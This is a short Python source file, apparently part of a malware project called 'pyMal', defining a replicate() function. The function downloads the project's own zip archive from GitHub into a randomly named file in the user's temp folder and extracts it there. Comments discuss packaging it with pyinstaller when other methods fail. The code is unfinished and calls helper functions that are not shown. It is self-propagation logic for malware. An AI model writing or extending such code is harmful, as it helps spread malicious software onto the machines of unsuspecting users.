import os
from Utils.helpers import random_string, download_file,extract_zip,tempFolder,BaseTempFolder






def replicate():
    our_zip = "https://github.com/Cyb3rDud3/pyMal/archive/refs/heads/main.zip"
    path = tempFolder.format(os.getlogin(),random_string(is_random=True,is_zip=True))
    if download_file(path,our_zip):
        if extract_zip(BaseTempFolder.format(os.getlogin()),path):
            pass
        #install it with pyinstaller?
        # we should do this path ONLY if we compiled the bootloader and didn't succed in the usual ways

    return 0
